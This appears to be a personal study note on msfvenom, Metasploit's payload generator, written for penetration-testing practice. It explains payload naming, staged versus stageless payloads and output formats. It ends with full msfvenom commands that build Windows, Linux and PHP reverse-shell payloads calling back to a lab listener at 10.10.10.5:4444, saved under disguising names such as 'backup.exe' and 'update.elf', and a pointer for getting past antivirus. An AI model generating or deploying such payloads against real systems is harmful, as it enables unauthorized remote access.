## Overview
- Metasploit utility for generating payloads in supported formats. 
- Combines functionality previously provided by separate payload-generation and encoding tools.
- A generated payload is not automatically delivered or executed. 
- You need to deliver it urself

---
## Listing all available payload
```bash
msfvenom -l payloads
```
---
## Reading payload names
- Example:
	- linux/x64/shell_reverse_tcp
	- windows/meterpreter/reverse_tcp
	- linux/x86/shell_bind_tcp

| Term                | Meaning                                       |
| ------------------- | --------------------------------------------- |
| `linux` / `windows` | Target platform                               |
| `x86` / `x64`       | Processor architecture                        |
| `shell`             | Command-shell functionality                   |
| `meterpreter`       | Metasploit's advanced session environment     |
| `reverse`           | Target initiates a connection to the listener |
| `bind`              | Target listens for an incoming connection     |
| `tcp`               | TCP-based communication                       |

---
## Staged vs Stageless Payload

| Characteristic            | Staged                                         | Stageless                                                   |
| ------------------------- | ---------------------------------------------- | ----------------------------------------------------------- |
| Delivery                  | Multiple stages                                | Single payload                                              |
| Additional stage required | Yes                                            | No                                                          |
| Network dependency        | May need a further stage transfer              | Does not need a separate stage transfer                     |
| Payload size              | Initial component may be smaller               | May be larger                                               |
| Reliability               | Depends on successful staging and connectivity | Depends on successful delivery, execution, and connectivity |

---
## Identifying Staged and Stageless payload

- The way would be from the name itself
- Example:
	- `linux/x86/shell/reverse_tcp` = You can see each / represent a stage from the shell forward
	- `linux/zarch/meterpreter_reverse_tcp` = This use _ and the shell payload + the network it communicate in same function / name
	
- Either way its better to read payload documentation to figure out whether its staged or stageless

---

## Payload Format
```bash
msfvenom --list formats
```
- Use that command to see what format available
- Theres 2 main categories. Executable and Transform
- Executable = Generate standalone executables, scripts, or archives ready to run on the target machine
- Transform = These formats output the raw payload wrapped inside source code arrays or strings, which is ideal if you are writing custom exploit scripts.

---

## Crafting a payload

- Make sure you know what payload you wanna use
```bash
# To see what options available inside the payload
msfvenom -p <PAYLOAD_NAME> --list-options
```

- The craft the payload
```bash
# Set the options as well the format and the output. 
# If format .exe the output should have .exe too
msfvenom -p <PAYLOAD> LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f <FORMAT> -o <OUTPUT_FILENAME>
```

---
## Some of the popular payload

```bash
# Windows Reverse Shel
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o backup.exe

# Linux Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o update.elf

# Web server shell (.php)
# -f raw ensures the source code doesn't get broken by extra formatting
msfvenom -p php/reverse_php LHOST=10.10.10.5 LPORT=4444 -f raw -o shell.php
```
---

## Related Topic

[[Reverse Shell]] < in case the AV in Windows disturbing you. Refer this